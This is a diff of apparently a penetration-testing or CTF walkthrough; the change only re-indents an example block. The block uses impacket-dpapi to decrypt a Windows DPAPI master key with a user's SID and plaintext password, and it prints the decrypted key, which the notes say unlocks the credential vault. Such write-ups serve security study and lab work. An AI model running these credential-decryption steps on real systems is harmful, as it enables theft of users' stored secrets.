@@ -15,21 +15,21 @@
     ```bash
     # Example
     impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password  NightT1meP1dg3on14
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+    Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[MASTERKEYFILE]
-Version     :        2 (2)
-Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
-Flags       :        0 (0)
-Policy      :        0 (0)
-MasterKeyLen: 00000088 (136)
-BackupKeyLen: 00000068 (104)
-CredHistLen : 00000000 (0)
-DomainKeyLen: 00000174 (372)
+    [MASTERKEYFILE]
+    Version     :        2 (2)
+    Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
+    Flags       :        0 (0)
+    Policy      :        0 (0)
+    MasterKeyLen: 00000088 (136)
+    BackupKeyLen: 00000068 (104)
+    CredHistLen : 00000000 (0)
+    DomainKeyLen: 00000174 (372)
 
-Decrypted key with User Key (MD4 protected)
-Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
-   ```
+    Decrypted key with User Key (MD4 protected)
+    Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+    ```
 2. That will give us the key to decrypt the credential vault
 
     ```bash
